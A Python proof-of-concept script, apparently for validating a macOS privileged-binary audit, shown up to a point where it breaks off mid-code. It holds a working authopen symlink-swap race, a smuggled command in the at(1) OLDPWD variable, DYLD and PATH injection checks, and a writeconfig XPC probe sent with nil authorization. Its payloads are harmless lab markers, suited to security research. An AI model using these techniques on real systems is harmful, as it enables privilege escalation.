#!/usr/bin/env python3
"""
Lab-safe proof-of-concept helpers for validating the macOS privileged-binary
audit findings in a controlled way.

These checks are designed to confirm the reported behavior without turning the
report into a weaponized exploit kit:

- authopen TOCTOU is validated by swapping one unreadable lab file for a
  symlink to a second unreadable lab file.
- at(1) checks focus on generated-script integrity and environment handling.
- security_authtrampoline coverage is limited to caller enumeration.
"""

from __future__ import annotations

import argparse
import datetime as dt
import json
import os
import plistlib
import re
import shlex
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import textwrap
import time
from pathlib import Path
from typing import Iterable


REPO_ROOT = Path(__file__).resolve().parents[1]
GENERATED_ROOT = REPO_ROOT / "generated" / "security_pocs"
AUTHOPEN_PATH = Path("/usr/libexec/authopen")
AT_PATH = Path("/usr/bin/at")
AT_JOB_DIR = Path("/private/var/at/jobs")
AT_SPOOL_DIR = Path("/private/var/at/spool")
FILENAME_RE = re.compile(r"^(?P<queue>[A-Za-z])(?P<jobno>[0-9a-fA-F]{5})(?P<minutes>[0-9a-fA-F]{8})$")
JOB_RE = re.compile(r"job\s+(?P<job>\d+)")
SELECTOR_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(:[A-Za-z0-9_]+)*:?$")


def utc_now() -> str:
    return dt.datetime.now(dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")


def make_output_dir(name: str, explicit: str | None = None) -> Path:
    if explicit:
        outdir = Path(explicit).expanduser().resolve()
    else:
        outdir = GENERATED_ROOT / f"{name}_{utc_now()}"
    outdir.mkdir(parents=True, exist_ok=True)
    return outdir


def run(
    cmd: list[str],
    *,
    input_text: str | None = None,
    env: dict[str, str] | None = None,
    check: bool = True,
) -> subprocess.CompletedProcess[str]:
    proc = subprocess.run(
        cmd,
        input=input_text,
        text=True,
        encoding="utf-8",
        errors="replace",
        capture_output=True,
        env=env,
    )
    if check and proc.returncode != 0:
        raise RuntimeError(
            f"command failed ({proc.returncode}): {' '.join(shlex.quote(part) for part in cmd)}\n"
            f"stdout:\n{proc.stdout}\n"
            f"stderr:\n{proc.stderr}"
        )
    return proc


def write_text(path: Path, content: str) -> None:
    path.write_text(content, encoding="utf-8")


def write_json(path: Path, data: object) -> None:
    path.write_text(json.dumps(data, indent=2, sort_keys=True), encoding="utf-8")


def read_json(path: Path) -> object:
    return json.loads(path.read_text(encoding="utf-8"))


def latest_artifact_dir(prefix: str) -> Path | None:
    candidates = sorted(GENERATED_ROOT.glob(f"{prefix}_*"))
    return candidates[-1] if candidates else None


def create_sqlite_db(path: Path) -> None:
    if path.exists():
        path.unlink()
    conn = sqlite3.connect(path)
    try:
        conn.execute(
            "CREATE TABLE access (service TEXT, client TEXT, auth_value INTEGER, auth_reason INTEGER)"
        )
        conn.execute(
            "INSERT INTO access (service, client, auth_value, auth_reason) VALUES (?, ?, ?, ?)",
            ("kTCCServiceSystemPolicyAllFiles", "com.example.Decoy", 2, 4),
        )
        conn.commit()
    finally:
        conn.close()


def execute_authopen_swap(
    *,
    outdir: Path,
    header: str,
    instructions_body: str,
    gate: Path,
    payload: Path,
    gate_backup: Path,
    success_label: str,
    success_check,
    dry_run: bool,
    initial_delay: float,
    timeout: int,
    expected_vulnerable: str,
    expected_non_vulnerable: str,
) -> int:
    instructions = textwrap.dedent(
        f"""
        {header}
        {'-' * len(header)}
        Gate path:    {gate}
        Payload path: {payload}

        {instructions_body}

        Steps:
        1. The script launches /usr/libexec/authopen on the unreadable gate file.
        2. Wait for the authorization dialog to appear.
        3. Do NOT approve it yet.
        4. Press Enter in this terminal so the gate path is swapped to a symlink.
        5. Then approve the dialog.

        Expected vulnerable result:
        {expected_vulnerable}

        Expected non-vulnerable result:
        {expected_non_vulnerable}
        """
    ).strip()
    write_text(outdir / "instructions.txt", instructions + "\n")

    if dry_run:
        result = {
            "mode": "dry-run",
            "gate": str(gate),
            "payload": str(payload),
            "expected_vulnerable": expected_vulnerable,
            "expected_non_vulnerable": expected_non_vulnerable,
        }
        write_json(json_result_path(outdir), result)
        print_summary(instructions + f"\n\nArtifacts: {outdir}")
        return 0

    if not AUTHOPEN_PATH.exists():
        raise RuntimeError(f"{AUTHOPEN_PATH} not found")

    proc = subprocess.Popen(
        [str(AUTHOPEN_PATH), str(gate)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding="utf-8",
        errors="replace",
    )

    print(instructions)
    print("\nWaiting briefly for authopen to reach the authorization step...")
    time.sleep(max(initial_delay, 0.0))

    if proc.poll() is not None:
        stdout, stderr = proc.communicate()
        write_text(outdir / "authopen.stdout.txt", stdout)
        write_text(outdir / "authopen.stderr.txt", stderr)
        result = {
            "mode": "runtime",
            "status": "authopen-exited-before-swap",
            "returncode": proc.returncode,
            "stdout": stdout,
            "stderr": stderr,
        }
        write_json(json_result_path(outdir), result)
        print_summary(
            f"authopen exited before the swap step.\nArtifacts: {outdir}\n"
            "This can happen if authorization is denied immediately or the dialog never appeared."
        )
        return 1

    input("\nPress Enter once the auth dialog is visible and you are ready to swap the path...")

    gate.rename(gate_backup)
    os.symlink(str(payload), str(gate))

    print("Swap complete. Approve the dialog now, then wait for authopen to finish...")
    try:
        stdout, stderr = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        stdout, stderr = proc.communicate()
        write_text(outdir / "authopen.stdout.txt", stdout)
        write_text(outdir / "authopen.stderr.txt", stderr)
        result = {
            "mode": "runtime",
            "status": "timeout",
            "timeout_seconds": timeout,
            "stdout": stdout,
            "stderr": stderr,
        }
        write_json(json_result_path(outdir), result)
        print_summary(f"Timed out waiting for authopen.\nArtifacts: {outdir}")
        return 1

    write_text(outdir / "authopen.stdout.txt", stdout)
    write_text(outdir / "authopen.stderr.txt", stderr)

    confirmed = success_check(stdout)
    result = {
        "mode": "runtime",
        "status": "completed",
        "returncode": proc.returncode,
        "confirmed": confirmed,
        "success_label": success_label,
        "stdout_preview": stdout[:200],
        "stderr_preview": stderr[:200],
        "gate_path": str(gate),
        "payload_path": str(payload),
        "gate_backup": str(gate_backup),
    }
    write_json(json_result_path(outdir), result)

    summary = [
        f"Artifacts: {outdir}",
        f"Return code: {proc.returncode}",
        f"{success_label}: {'yes' if confirmed else 'no'}",
    ]
    if confirmed:
        summary.append("Interpretation: the post-authorization open followed the swapped target.")
    else:
        summary.append("Interpretation: this run did not confirm the reported TOCTOU behavior.")
    print_summary("\n".join(summary))
    return 0 if confirmed else 1


def execute_authopen_no_swap(
    *,
    outdir: Path,
    header: str,
    instructions_body: str,
    gate: Path,
    dry_run: bool,
    initial_delay: float,
    timeout: int,
    expected_success: str,
) -> tuple[int, str]:
    instructions = textwrap.dedent(
        f"""
        {header}
        {'-' * len(header)}
        Gate path:    {gate}

        {instructions_body}

        Steps:
        1. The script launches /usr/libexec/authopen on the unreadable gate file.
        2. Wait for the authorization dialog to appear.
        3. Click Allow without changing the file.

        Expected result:
        {expected_success}
        """
    ).strip()
    write_text(outdir / "instructions.txt", instructions + "\n")

    if dry_run:
        write_json(
            json_result_path(outdir),
            {
                "mode": "dry-run",
                "gate": str(gate),
                "expected_success": expected_success,
            },
        )
        print_summary(instructions + f"\n\nArtifacts: {outdir}")
        return 0, ""

    proc = subprocess.Popen(
        [str(AUTHOPEN_PATH), str(gate)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        encoding="utf-8",
        errors="replace",
    )

    print(instructions)
    print("\nWaiting briefly for the authorization dialog...")
    time.sleep(max(initial_delay, 0.0))
    print("Approve the dialog now, without swapping the file.")

    try:
        stdout, stderr = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        stdout, stderr = proc.communicate()
        write_text(outdir / "authopen.stdout.txt", stdout)
        write_text(outdir / "authopen.stderr.txt", stderr)
        write_json(
            json_result_path(outdir),
            {
                "mode": "runtime",
                "status": "timeout",
                "timeout_seconds": timeout,
                "stdout": stdout,
                "stderr": stderr,
            },
        )
        print_summary(f"Timed out waiting for authopen.\nArtifacts: {outdir}")
        return 1, stdout

    write_text(outdir / "authopen.stdout.txt", stdout)
    write_text(outdir / "authopen.stderr.txt", stderr)
    write_json(
        json_result_path(outdir),
        {
            "mode": "runtime",
            "status": "completed",
            "returncode": proc.returncode,
            "stdout_preview": stdout[:200],
            "stderr_preview": stderr[:200],
            "gate_path": str(gate),
        },
    )

    print_summary(f"Artifacts: {outdir}\nReturn code: {proc.returncode}")
    return proc.returncode, stdout


def scheduled_time_spec(minutes_ahead: int) -> str:
    run_at = dt.datetime.now() + dt.timedelta(minutes=minutes_ahead)
    return run_at.strftime("%H:%M")


def schedule_at_job(payload: str, *, minutes_ahead: int, env: dict[str, str]) -> tuple[int, str]:
    proc = run([str(AT_PATH), scheduled_time_spec(minutes_ahead)], input_text=payload, env=env)
    combined = f"{proc.stdout}\n{proc.stderr}"
    match = JOB_RE.search(combined)
    if not match:
        raise RuntimeError(f"failed to parse job id from at output:\n{combined}")
    job_id = int(match.group("job"))
    return job_id, combined.strip()


def at_job_script(job_id: int) -> str:
    return run([str(AT_PATH), "-c", str(job_id)]).stdout


def at_job_listing(job_id: int) -> str:
    proc = run([str(AT_PATH), "-l", str(job_id)], check=False)
    return (proc.stdout + proc.stderr).strip()


def remove_at_job(job_id: int) -> None:
    run([str(AT_PATH), "-r", str(job_id)], check=False)


def json_result_path(outdir: Path) -> Path:
    return outdir / "result.json"


def print_summary(summary: str) -> None:
    print(summary.strip())


def command_authopen_toctou(args: argparse.Namespace) -> int:
    outdir = make_output_dir("authopen_toctou", args.output_dir)
    lab_dir = outdir / "lab"
    lab_dir.mkdir(parents=True, exist_ok=True)

    gate = lab_dir / "gate.txt"
    payload = lab_dir / "payload.txt"
    gate_backup = lab_dir / "gate.before-swap.txt"

    gate_marker = "AUTHOPEN_GATE_MARKER\n"
    payload_marker = "AUTHOPEN_PAYLOAD_MARKER\n"

    write_text(gate, gate_marker)
    write_text(payload, payload_marker)
    gate.chmod(0)
    payload.chmod(0)
    return execute_authopen_swap(
        outdir=outdir,
        header="authopen TOCTOU validation",
        instructions_body=(
            "This PoC is lab-safe: it never targets a system file. It only checks\n"
            "whether /usr/libexec/authopen returns the payload marker after the\n"
            "authorized path has been swapped to a symlink."
        ),
        gate=gate,
        payload=payload,
        gate_backup=gate_backup,
        success_label="Confirmed payload marker after swap",
        success_check=lambda stdout: payload_marker in stdout,
        dry_run=args.dry_run,
        initial_delay=args.initial_delay,
        timeout=args.timeout,
        expected_vulnerable=f"stdout contains: {payload_marker.strip()}",
        expected_non_vulnerable=f"stdout contains: {gate_marker.strip()}\nor the open fails after the swap.",
    )


def command_authopen_decoy_sqlite(args: argparse.Namespace) -> int:
    outdir = make_output_dir("authopen_decoy_sqlite", args.output_dir)
    lab_dir = outdir / "lab"
    lab_dir.mkdir(parents=True, exist_ok=True)

    gate = lab_dir / "gate.txt"
    payload = lab_dir / "decoy_tcc.db"
    gate_backup = lab_dir / "gate.before-swap.txt"

    write_text(gate, "AUTHOPEN_DECOY_GATE\n")
    create_sqlite_db(payload)
    gate.chmod(0)
    payload.chmod(0)

    return execute_authopen_swap(
        outdir=outdir,
        header="authopen TOCTOU decoy SQLite validation",
        instructions_body=(
            "This variant uses a harmless local SQLite database as the swapped target,\n"
            "so you can demonstrate database-like impact without touching any real\n"
            "protected store such as TCC.db."
        ),
        gate=gate,
        payload=payload,
        gate_backup=gate_backup,
        success_label="Confirmed SQLite header after swap",
        success_check=lambda stdout: stdout.startswith("SQLite format 3"),
        dry_run=args.dry_run,
        initial_delay=args.initial_delay,
        timeout=args.timeout,
        expected_vulnerable="stdout starts with: SQLite format 3",
        expected_non_vulnerable="stdout contains the bait marker or the open fails after the swap.",
    )


def command_authopen_proof_pack(args: argparse.Namespace) -> int:
    outdir = make_output_dir("authopen_proof_pack", args.output_dir)
    lab_dir = outdir / "lab"
    control_dir = outdir / "control"
    race_dir = outdir / "race"
    lab_dir.mkdir(parents=True, exist_ok=True)
    control_dir.mkdir(parents=True, exist_ok=True)
    race_dir.mkdir(parents=True, exist_ok=True)

    gate = lab_dir / "gate.txt"
    gate_backup = lab_dir / "gate.before-swap.txt"
    payload = lab_dir / "payload.txt"

    bait_marker = "PROOF_PACK_BAIT_CONTENT\n"
    payload_marker = "PROOF_PACK_PAYLOAD_CONTENT\n"

    write_text(payload, payload_marker)
    payload.chmod(0)

    overall = textwrap.dedent(
        f"""
        authopen differential proof pack
        --------------------------------
        This pack runs two interactive validations against the same visible bait path:

        1. Control run: no swap
        2. Race run: bait path swapped to payload after authorization is requested

        Reviewer-safe claim:
        the same visible path is approved in both cases, but the returned content differs
        only when the swap is introduced.

        Shared bait path:
        {gate}

        Payload path:
        {payload}
        """
    ).strip()
    write_text(outdir / "overview.txt", overall + "\n")

    if args.dry_run:
        write_text(gate, bait_marker)
        gate.chmod(0)
        write_json(
            json_result_path(outdir),
            {
                "mode": "dry-run",
                "gate": str(gate),
                "payload": str(payload),
                "bait_marker": bait_marker.strip(),
                "payload_marker": payload_marker.strip(),
            },
        )
        print_summary(overall + f"\n\nArtifacts: {outdir}")
        return 0

    print(overall)
    print("\nPhase 1 of 2: control run starting...")
    write_text(gate, bait_marker)
    gate.chmod(0)
    control_rc, control_stdout = execute_authopen_no_swap(
        outdir=control_dir,
        header="authopen control validation",
        instructions_body=(
            "This phase keeps the bait file in place. It shows what authopen returns\n"
            "when the approved object is not swapped."
        ),
        gate=gate,
        dry_run=False,
        initial_delay=args.initial_delay,
        timeout=args.timeout,
        expected_success=f"stdout contains: {bait_marker.strip()}",
    )

    print("\nPhase 2 of 2: race run starting...")
    if gate.exists() or gate.is_symlink():
        gate.unlink()
    if gate_backup.exists():
        gate_backup.unlink()
    write_text(gate, bait_marker)
    gate.chmod(0)
    race_rc = execute_authopen_swap(
        outdir=race_dir,
        header="authopen raced validation",
        instructions_body=(
            "This phase swaps the same bait path to a different payload after the\n"
            "authorization check but before the privileged open."
        ),
        gate=gate,
        payload=payload,
        gate_backup=gate_backup,
        success_label="Confirmed payload marker after swap",
        success_check=lambda stdout: payload_marker in stdout,
        dry_run=False,
        initial_delay=args.initial_delay,
        timeout=args.timeout,
        expected_vulnerable=f"stdout contains: {payload_marker.strip()}",
        expected_non_vulnerable=f"stdout contains: {bait_marker.strip()}\nor the open fails after the swap.",
    )

    race_result = read_json(race_dir / "result.json")
    race_confirmed = bool(race_result.get("confirmed"))
    control_confirmed = bait_marker in control_stdout

    proof = textwrap.dedent(
        f"""
        # authopen Differential Proof Pack

        Generated: {dt.datetime.now().astimezone().isoformat()}

        ## Shared Visible Path

        `{gate}`

        ## Control

        - return code: {control_rc}
        - bait content observed: {"yes" if control_confirmed else "no"}
        - artifact: {control_dir}

        ## Race

        - return code: {race_rc}
        - payload content observed after swap: {"yes" if race_confirmed else "no"}
        - artifact: {race_dir}

        ## Conclusion

        {"The differential result supports a TOCTOU claim: the same visible bait path was approved, but a different object was returned after the swap." if control_confirmed and race_confirmed else "The latest pair of runs did not fully confirm the differential claim. Re-run until the control returns bait and the race returns payload."}
        """
    ).strip() + "\n"
    write_text(outdir / "proof_pack.md", proof)
    write_json(
        json_result_path(outdir),
        {
            "control_artifact": str(control_dir),
            "race_artifact": str(race_dir),
            "control_confirmed": control_confirmed,
            "race_confirmed": race_confirmed,
            "shared_gate_path": str(gate),
            "payload_path": str(payload),
        },
    )

    print_summary(f"\nArtifacts: {outdir}\nProof pack: {outdir / 'proof_pack.md'}")
    return 0 if control_confirmed and race_confirmed else 1


def command_at_oldpwd(args: argparse.Namespace) -> int:
    outdir = make_output_dir("at_oldpwd", args.output_dir)
    marker_path = outdir / "oldpwd_injected.txt"
    payload = "echo normal\n"
    injected = f"/tmp; /usr/bin/id > {shlex.quote(str(marker_path))}"

    env = os.environ.copy()
    env["OLDPWD"] = injected

    job_id, schedule_output = schedule_at_job(payload, minutes_ahead=args.minutes_ahead, env=env)
    script = at_job_script(job_id)

    write_text(outdir / "job_script.sh", script)
    write_text(outdir / "at_submission.txt", schedule_output + "\n")

    confirmed = str(marker_path) in script and f"OLDPWD={injected}; export OLDPWD" in script
    job_listing = at_job_listing(job_id)

    executed = False
    if args.wait_seconds > 0:
        deadline = time.time() + args.wait_seconds
        while time.time() < deadline:
            if marker_path.exists():
                executed = True
                break
            time.sleep(1)

    if not args.keep_job:
        remove_at_job(job_id)

    result = {
        "job_id": job_id,
        "job_listing": job_listing,
        "confirmed_in_script": confirmed,
        "executed_marker_present": executed,
        "injected_marker_path": str(marker_path),
        "wait_seconds": args.wait_seconds,
    }
    write_json(json_result_path(outdir), result)

    summary_lines = [
        f"Artifacts: {outdir}",
        f"Job id: {job_id}",
        f"Confirmed raw OLDPWD injection in generated script: {'yes' if confirmed else 'no'}",
    ]
    if args.wait_seconds > 0:
        summary_lines.append(
            f"Observed runtime marker within {args.wait_seconds}s: {'yes' if executed else 'no'}"
        )
    else:
        summary_lines.append("Runtime execution was not awaited; this check confirmed the script-generation flaw.")
    print_summary("\n".join(summary_lines))
    return 0 if confirmed else 1


def command_at_env(args: argparse.Namespace) -> int:
    outdir = make_output_dir("at_env", args.output_dir)
    env = os.environ.copy()
    env["IFS"] = ","
    env["PATH"] = "/tmp/pocbin:/usr/bin:/bin"
    env["DYLD_INSERT_LIBRARIES"] = "/tmp/poc-injected.dylib"
    env["DYLD_LIBRARY_PATH"] = "/tmp/poc-dyld"

    job_id, schedule_output = schedule_at_job("echo env-check\n", minutes_ahead=args.minutes_ahead, env=env)
    script = at_job_script(job_id)

    write_text(outdir / "job_script.sh", script)
    write_text(outdir / "at_submission.txt", schedule_output + "\n")

    findings = {
        "IFS_serialized": "export IFS=," in script or "IFS=,; export IFS" in script,
        "PATH_serialized": "export PATH=/tmp/pocbin:/usr/bin:/bin" in script,
        "DYLD_INSERT_LIBRARIES_serialized": "/tmp/poc-injected.dylib" in script,
        "DYLD_LIBRARY_PATH_serialized": "/tmp/poc-dyld" in script,
    }

    if not args.keep_job:
        remove_at_job(job_id)

    result = {"job_id": job_id, **findings}
    write_json(json_result_path(outdir), result)

    summary = textwrap.dedent(
        f"""
        Artifacts: {outdir}
        Job id: {job_id}
        IFS serialized into job script: {'yes' if findings['IFS_serialized'] else 'no'}
        PATH serialized into job script: {'yes' if findings['PATH_serialized'] else 'no'}
        DYLD_INSERT_LIBRARIES serialized into job script: {'yes' if findings['DYLD_INSERT_LIBRARIES_serialized'] else 'no'}
        DYLD_LIBRARY_PATH serialized into job script: {'yes' if findings['DYLD_LIBRARY_PATH_serialized'] else 'no'}

        On current macOS builds, DYLD_* may be absent here because the kernel strips
        those variables before the setuid-root /usr/bin/at process receives them.
        """
    )
    print_summary(summary)
    return 0


def parse_job_filename(name: str) -> dict[str, object] | None:
    match = FILENAME_RE.match(name)
    if not match:
        return None
    minutes_since_epoch = int(match.group("minutes"), 16)
    scheduled = dt.datetime.fromtimestamp(minutes_since_epoch * 60, tz=dt.timezone.utc)
    local_scheduled = scheduled.astimezone()
    return {
        "filename": name,
        "queue": match.group("queue"),
        "job_number_hex": match.group("jobno"),
        "job_number": int(match.group("jobno"), 16),
        "minutes_since_epoch_hex": match.group("minutes"),
        "minutes_since_epoch": minutes_since_epoch,
        "scheduled_utc": scheduled.isoformat(),
        "scheduled_local": local_scheduled.isoformat(),
    }


def command_spool_enum(args: argparse.Namespace) -> int:
    outdir = make_output_dir("spool_enum", args.output_dir)

    entries: list[dict[str, object]] = []
    for path in sorted(AT_JOB_DIR.iterdir(), key=lambda item: item.name):
        parsed = parse_job_filename(path.name)
        if parsed is None:
            continue
        parsed["mode"] = oct(path.stat().st_mode & 0o777)
        parsed["owner"] = path.stat().st_uid
        entries.append(parsed)

    write_json(json_result_path(outdir), {"job_dir": str(AT_JOB_DIR), "entries": entries})

    lines = [
        f"Artifacts: {outdir}",
        f"Job directory: {AT_JOB_DIR}",
        f"Spool directory: {AT_SPOOL_DIR}",
        f"Decoded job entries: {len(entries)}",
    ]
    for entry in entries:
        lines.append(
            f"- {entry['filename']}: queue={entry['queue']} job={entry['job_number']} "
            f"scheduled_local={entry['scheduled_local']}"
        )
    print_summary("\n".join(lines))
    return 0


def iter_candidate_app_binaries(roots: Iterable[Path]) -> Iterable[Path]:
    for root in roots:
        if not root.exists():
            continue
        if root.is_file():
            yield root
            continue
        apps: list[Path] = []
        if root.suffix == ".app":
            apps.append(root)
        apps.extend(root.rglob("*.app"))
        seen_apps: set[Path] = set()
        for app in apps:
            app = app.resolve()
            if app in seen_apps:
                continue
            seen_apps.add(app)
            info = app / "Contents" / "Info.plist"
            if not info.exists():
                continue
            try:
                with info.open("rb") as fh:
                    plist = plistlib.load(fh)
            except Exception:
                continue
            exe_name = plist.get("CFBundleExecutable")
            if not exe_name:
                continue
            binary = app / "Contents" / "MacOS" / exe_name
            if binary.exists():
                yield binary


def binary_mentions_auth_exec(binary: Path) -> dict[str, object] | None:
    tool_cmds = [
        ["otool", "-Iv", str(binary)],
        ["strings", "-a", str(binary)],
    ]
    needles = ("AuthorizationExecuteWithPrivileges", "security_authtrampoline")
    evidence: list[str] = []

    for cmd in tool_cmds:
        proc = run(cmd, check=False)
        text = (proc.stdout or "") + "\n" + (proc.stderr or "")
        for needle in needles:
            if needle in text:
                evidence.append(needle)
        if evidence:
            break

    if not evidence:
        return None

    return {
        "binary": str(binary),
        "evidence": sorted(set(evidence)),
    }


def app_root_for_binary(binary: Path) -> Path | None:
    for candidate in [binary, *binary.parents]:
        if candidate.suffix == ".app":
            return candidate
    return None


def app_metadata_for_binary(binary: Path) -> dict[str, object]:
    app_root = app_root_for_binary(binary)
    if app_root is None:
        return {}

    info_plist = app_root / "Contents" / "Info.plist"
    if not info_plist.exists():
        return {"app_bundle": str(app_root)}

    try:
        with info_plist.open("rb") as fh:
            plist = plistlib.load(fh)
    except Exception:
        return {"app_bundle": str(app_root)}

    return {
        "app_bundle": str(app_root),
        "bundle_id": plist.get("CFBundleIdentifier"),
        "bundle_name": plist.get("CFBundleName") or plist.get("CFBundleDisplayName"),
        "bundle_version": plist.get("CFBundleShortVersionString") or plist.get("CFBundleVersion"),
    }


def collect_sw_vers() -> dict[str, str]:
    proc = run(["sw_vers"], check=False)
    facts: dict[str, str] = {}
    for line in proc.stdout.splitlines():
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        facts[key.strip()] = value.strip()
    return facts


def collect_path_facts(path: Path, *, allow_probe: bool = False) -> dict[str, object]:
    facts: dict[str, object] = {
        "path": str(path),
        "exists": path.exists(),
        "os_access_write": os.access(path, os.W_OK),
    }
    ls_proc = run(["ls", "-ldeO", str(path)], check=False)
    facts["ls_output"] = stringify_command_output(ls_proc)
    if not path.exists():
        return facts

    stat_result = path.stat()
    facts["is_dir"] = path.is_dir()
    facts["mode_octal"] = oct(stat_result.st_mode & 0o777)
    facts["world_writable_mode"] = bool(stat_result.st_mode & 0o002)

    if allow_probe and path.is_dir():
        probe_path: str | None = None
        try:
            fd, probe_path = tempfile.mkstemp(prefix="codex_probe_", dir=path)
            os.close(fd)
            facts["probe_create_delete"] = "ok"
        except Exception as exc:
            facts["probe_create_delete"] = f"failed: {exc!r}"
        finally:
            if probe_path and os.path.exists(probe_path):
                os.unlink(probe_path)

    return facts


def collect_launchd_path_triggers() -> list[dict[str, object]]:
    entries: list[dict[str, object]] = []
    for plist_path in sorted(Path("/System/Library/LaunchDaemons").glob("*.plist")):
        try:
            plist = plistlib.loads(plist_path.read_bytes())
        except Exception:
            continue

        refs: list[tuple[str, str]] = []
        for key in ("WatchPaths", "QueueDirectories"):
            value = plist.get(key)
            if isinstance(value, list):
                refs.extend((key, str(item)) for item in value)

        launch_events = plist.get("LaunchEvents", {})
        if isinstance(launch_events, dict):
            for event_type, body in launch_events.items():
                if event_type != "com.apple.fsevents.matching" or not isinstance(body, dict):
                    continue
                for name, item in body.items():
                    if isinstance(item, dict) and item.get("Path"):
                        refs.append((f"LaunchEvents:{name}", str(item["Path"])))

        for kind, raw_path in refs:
            candidate = Path(raw_path)
            facts = collect_path_facts(candidate)
            entries.append(
                {
                    "plist": str(plist_path),
                    "label": plist.get("Label"),
                    "program": plist.get("Program") or plist.get("ProgramArguments", [None])[0],
                    "kind": kind,
                    "path_facts": facts,
                }
            )
    return entries


def extract_selector_candidates(text: str) -> list[str]:
    selectors: list[str] = []
    seen: set[str] = set()
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line:
            continue
        if re.match(r"^\d+:", line):
            _, line = line.split(":", 1)
            line = line.strip()
        if ":" not in line:
            continue
        if len(line) > 160:
            continue
        if not SELECTOR_RE.match(line):
            continue
        if line.startswith(("_", "NS", "CF")):
            continue
        if line not in seen:
            seen.add(line)
            selectors.append(line)
    return selectors


def classify_writeconfig_selectors(selectors: Iterable[str]) -> dict[str, list[str]]:
    selector_list = list(selectors)
    auth_explicit = [
        selector
        for selector in selector_list
        if "authorization" in selector.lower() or "_withAuthorization" in selector
    ]
    result_or_reply = [
        selector
        for selector in selector_list
        if selector.endswith("result:") or selector.endswith("reply:")
    ]

    internal_prefixes = (
        "setAllowed",
        "setClient",
        "setDefault",
        "setDelegate",
        "setExported",
        "setFileOperationQueue",
        "setInvalidationHandler",
        "setLanguageRegionClient",
        "setLaunchPath",
        "setObject",
        "setValue",
        "setVoiceOverClient",
        "setWorkQueue",
        "fileManager:",
    )
    suspicious_verbs = (
        "create",
        "remove",
        "move",
        "store",
        "write",
        "issue",
        "kill",
        "launch",
        "touch",
        "update",
        "suspend",
        "sc",
        "set",
        "run",
        "wakeup",
    )
    suspicious_keywords = (
        "password",
        "firewall",
        "keychain",
        "guest",
        "vnc",
        "remote",
        "time",
        "machine",
        "domain",
        "netboot",
        "ownership",
        "permissions",
        "path",
        "file",
        "directory",
        "startup",
        "install",
    )

    suspicious_noauth_mutators: list[str] = []
    for selector in selector_list:
        lowered = selector.lower()
        if selector in auth_explicit:
            continue
        if selector.startswith(internal_prefixes):
            continue
        if not lowered.startswith(suspicious_verbs):
            continue
        if not any(keyword in lowered for keyword in suspicious_keywords):
            continue
        suspicious_noauth_mutators.append(selector)

    return {
        "all": selector_list,
        "auth_explicit": auth_explicit,
        "result_or_reply": result_or_reply,
        "suspicious_noauth_mutators": suspicious_noauth_mutators,
    }


def run_writeconfig_readonly_probe() -> dict[str, object]:
    source = textwrap.dedent(
        r"""
        #import <Foundation/Foundation.h>
        #import <dispatch/dispatch.h>

        @protocol WriteConfigProbe
        - (void)directorySizeAtPath:(NSString *)path authorization:(NSData *)authorization result:(void (^)(id value, NSError *error))reply;
        - (void)requestNumberOfClientsForProtocols:(NSArray *)protocols authorization:(NSData *)authorization result:(void (^)(id value, NSError *error))reply;
        @end

        static NSString *FormatObject(id obj) {
            return obj ? [obj description] : @"<nil>";
        }

        static NSArray<NSString *> *RunRequestProbe(void) {
            NSMutableArray<NSString *> *events = [NSMutableArray array];
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.systemadministration.writeconfig" options:0];
            conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WriteConfigProbe)];
            conn.interruptionHandler = ^{
                [events addObject:@"interrupted"];
                dispatch_semaphore_signal(sem);
            };
            conn.invalidationHandler = ^{
                [events addObject:@"invalidated"];
                dispatch_semaphore_signal(sem);
            };
            [conn resume];
            [events addObject:@"resumed"];

            id<WriteConfigProbe> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
                [events addObject:[NSString stringWithFormat:@"proxy_error:%@:%ld:%@", error.domain, (long)error.code, error.localizedDescription]];
                dispatch_semaphore_signal(sem);
            }];

            [proxy requestNumberOfClientsForProtocols:@[@"XPCWriteConfigProtocol"] authorization:nil result:^(id value, NSError *error) {
                [events addObject:[NSString stringWithFormat:@"reply:value=%@ error=%@", FormatObject(value), FormatObject(error)]];
                dispatch_semaphore_signal(sem);
            }];

            long wait = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)));
            [events addObject:[NSString stringWithFormat:@"wait=%s", wait == 0 ? "signal" : "timeout"]];
            [conn invalidate];
            return events;
        }

        static NSArray<NSString *> *RunDirectorySizeProbe(void) {
            NSMutableArray<NSString *> *events = [NSMutableArray array];
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.systemadministration.writeconfig" options:0];
            conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WriteConfigProbe)];
            conn.interruptionHandler = ^{
                [events addObject:@"interrupted"];
                dispatch_semaphore_signal(sem);
            };
            conn.invalidationHandler = ^{
                [events addObject:@"invalidated"];
                dispatch_semaphore_signal(sem);
            };
            [conn resume];
            [events addObject:@"resumed"];

            id<WriteConfigProbe> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
                [events addObject:[NSString stringWithFormat:@"proxy_error:%@:%ld:%@", error.domain, (long)error.code, error.localizedDescription]];
                dispatch_semaphore_signal(sem);
            }];

            [proxy directorySizeAtPath:@"/private/var/db/DiagnosticsReporter" authorization:nil result:^(id value, NSError *error) {
                [events addObject:[NSString stringWithFormat:@"reply:value=%@ error=%@", FormatObject(value), FormatObject(error)]];
                dispatch_semaphore_signal(sem);
            }];

            long wait = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)));
            [events addObject:[NSString stringWithFormat:@"wait=%s", wait == 0 ? "signal" : "timeout"]];
            [conn invalidate];
            return events;
        }

        int main(void) {
            @autoreleasepool {
                NSDictionary *result = @{
